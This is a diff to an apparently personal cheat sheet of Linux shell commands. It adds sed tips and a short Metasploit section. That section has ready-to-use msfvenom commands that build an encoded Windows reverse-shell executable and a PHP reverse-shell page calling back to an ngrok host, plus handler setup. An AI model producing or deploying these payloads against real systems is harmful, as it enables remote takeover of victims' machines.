@@ -1213,6 +1213,9 @@ bash/zsh + linux terminal cli tools commands
     - add line to beginning to file: sed -i '1ifoobar' file
     - remove 1st line:  sed -i '1d' file
     - add comma to end of each line(apart from last) :  sed -i.bak '$!s/$/ ,/' file
+    - replace one line: sed 'Ns/.*/replacement-line/' file.txt > new_file.txt
+        - N = line number
+    - read single line: sed -n '1{p;q}' file
 - ssconvert (gnumeric) : spreadsheet convert
     - ssconvert a.xlsx a.csv
 - pkill
@@ -1321,6 +1324,17 @@ bash/zsh + linux terminal cli tools commands
     - listen on port: nc -lvvp 3345
     - listen on port and send string to client on connection:
         - echo "welcome" | nc -lvvp 2245
+- msfconsole: metasploit
+    - go to session: sessions -i 3
+    - sessions: sessions
+    - send session to background: bg
+    - meterpreter:
+        - set handler: use exploit/multi/handler
+        - php: set payload php/meterpreter/reverse_tcp
+        - exploit: exploit -j
+- msfvenom:
+    - windows: msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 25 LHOST=0.tcp.ngrok.io LPORT=12345 -f exe > 1.exe
+    - php: msfvenom -p php/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=12345 -f raw -o page.php
 
 ---------------------------------------------------------------------
 check user default shell
